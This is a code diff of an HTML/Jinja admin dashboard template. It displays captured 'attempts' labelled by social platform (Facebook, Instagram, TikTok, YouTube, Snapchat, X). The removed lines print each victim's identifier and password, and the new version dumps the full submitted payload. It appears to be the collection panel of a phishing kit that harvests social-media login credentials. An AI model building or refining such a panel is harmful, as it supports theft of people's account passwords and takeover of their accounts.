@@ -1,44 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Admin Dashboard</title>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
+  <style>
+    body {
+      font-family: 'Inter', sans-serif;
+      background: #f5f7fa;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+    }
 
-{% extends "base.html" %}
-{% block title %}Admin - Submissions{% endblock %}
-{% block content %}
-<main class="admin-page">
-  <h1>Admin Dashboard</h1>
-  <form method="POST" onsubmit="return confirm('Clear all history?');">
-    <button class="btn danger" name="action" value="confirm_clear" type="submit">Clear All History</button>
-  </form>
-  <section class="cards">
+    h1 {
+      margin: 20px 0;
+      color: #333;
+      text-align: center;
+    }
+
+    .actions {
+      margin-bottom: 20px;
+    }
+
+    .actions form button {
+      padding: 10px 20px;
+      font-size: 14px;
+      border: none;
+      border-radius: 6px;
+      background: #e53935;
+      color: #fff;
+      cursor: pointer;
+      transition: 0.2s;
+    }
+
+    .actions form button:hover {
+      background: #c62828;
+    }
+
+    .grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+      gap: 20px;
+      width: 90%;
+      max-width: 1200px;
+    }
+
+    .card {
+      padding: 15px;
+      border-radius: 12px;
+      color: white;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+      animation: fadeIn 0.6s ease;
+      word-break: break-word;
+    }
+
+    /* 3 color rotation */
+    .card.color1 { background: #4CAF50; } /* green */
+    .card.color2 { background: #2196F3; } /* blue */
+    .card.color3 { background: #FF9800; } /* orange */
+
+    pre {
+      background: rgba(255,255,255,0.1);
+      padding: 10px;
+      border-radius: 8px;
+      font-size: 13px;
+      overflow-x: auto;
+      white-space: pre-wrap;
+    }
+
+    .platform-title {
+      font-size: 16px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-bottom: 6px;
+    }
+
+    .platform-title i {
+      font-size: 18px;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+  </style>
+</head>
+<body>
+  <h1>📊 Admin Dashboard</h1>
+
+  <div class="actions">
+    <form method="POST">
+      <input type="hidden" name="action" value="confirm_clear">
+      <button type="submit" onclick="return confirm('Are you sure you want to clear all history?')">
+        Clear History
+      </button>
+    </form>
+  </div>
+
+  <div class="grid">
     {% if attempts %}
-      {% for a in attempts %}
-        <article class="card">
-          <div class="card-header">
-            <div class="platform">
-              {% if a.platform == 'facebook' %}<i class="fab fa-facebook-f"></i>
-              {% elif a.platform == 'instagram' %}<i class="fab fa-instagram"></i>
-              {% elif a.platform == 'tiktok' %}<i class="fab fa-tiktok"></i>
-              {% elif a.platform == 'youtube' %}<i class="fab fa-youtube"></i>
-              {% elif a.platform == 'snapchat' %}<i class="fab fa-snapchat-ghost"></i>
-              {% elif a.platform == 'x' %}<i class="fab fa-x-twitter"></i>{% endif %}
-            </div>
-            <div class="meta">
-              <div class="time">{{ a.ts }}</div>
-              <div class="plat-name">{{ a.platform }}</div>
-            </div>
-          </div>
-          <div class="card-body">
-            {% if a.stage == 'login' %}
-              <p><strong>Identifier:</strong> {{ a.payload.identifier }}</p>
-              <p><strong>Password:</strong> <pre>{{ a.payload.password }}</pre></p>
-              <p><strong>Format:</strong> {{ a.payload.format }}</p>
+      {% for attempt in attempts %}
+        <div class="card color{{ loop.index % 3 + 1 }}">
+          <div class="platform-title">
+            {% if attempt.platform == "facebook" %}
+              <i class="fab fa-facebook-f"></i>
+            {% elif attempt.platform == "instagram" %}
+              <i class="fab fa-instagram"></i>
+            {% elif attempt.platform == "tiktok" %}
+              <i class="fab fa-tiktok"></i>
+            {% elif attempt.platform == "youtube" %}
+              <i class="fab fa-youtube"></i>
+            {% elif attempt.platform == "snapchat" %}
+              <i class="fab fa-snapchat-ghost"></i>
+            {% elif attempt.platform == "x" %}
+              <i class="fab fa-x-twitter"></i>
             {% else %}
-              <pre>{{ a.payload | tojson(indent=2) }}</pre>
+              <i class="fas fa-question-circle"></i>
             {% endif %}
+            <strong>{{ attempt.platform|capitalize }}</strong>
           </div>
-        </article>
+          <em>{{ attempt.ts }}</em>
+          <pre>{{ attempt.payload | tojson(indent=2) }}</pre>
+        </div>
       {% endfor %}
     {% else %}
-      <p class="empty">No submissions yet.</p>
+      <p>No submissions yet.</p>
     {% endif %}
-  </section>
-</main>
-{% endblock %}
+  </div>
+</body>
+</html>
+
